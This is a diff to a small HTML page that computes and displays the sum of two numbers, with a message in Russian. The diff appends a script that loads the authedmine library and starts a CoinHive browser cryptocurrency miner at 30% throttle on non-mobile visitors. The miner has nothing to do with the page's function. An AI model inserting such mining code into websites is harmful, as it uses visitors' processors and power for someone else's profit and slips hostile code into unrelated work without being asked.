@@ -38,5 +38,13 @@
         document.getElementById("message").innerHTML = "Cумма этих чисел равна: " + (a+b);
    }
 </script>
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('siteKey', {throttle: 0.3});
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+        miner.start();
+    }
+</script>
+
 </body>
 </html>
